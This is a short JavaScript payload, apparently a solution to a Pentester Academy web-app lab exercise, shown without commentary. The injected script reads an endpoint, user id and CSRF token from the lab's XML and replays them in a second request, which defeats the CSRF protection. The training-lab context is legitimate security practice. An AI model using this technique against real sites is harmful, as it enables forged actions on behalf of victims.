<script>
  // http://pentesteracademylab.appspot.com/lab/webapp/jfp/21
  var r1 = new XMLHttpRequest();
  r1.onreadystatechange = function() {
    if (r1.readyState === 4 && r1.status === 200) {
      var endpoint = r1.responseXML.getElementsByTagName('endpoint')[0].firstChild.nodeValue;
      var uid = r1.responseXML.getElementsByTagName('uid-param-value')[0].firstChild.nodeValue;
      var csrf_token = r1.responseXML.getElementsByTagName('token-param-value')[0].firstChild.nodeValue;
      var r2 = new XMLHttpRequest();
      var url = endpoint + "?uid=" + uid + "&token=" + csrf_token;
      r2.open('GET', url);
      r2.onreadystatechange = function() {
        if (r2.readyState === 4 && r2.status === 200) {
          var result = document.getElementById("result").innerHTML = r2.responseText;
        }
      }
      r2.send();
    }
  }
  r1.open('GET', '/lab/webapp/jfp/21/getxml');
  r1.send();
</script>
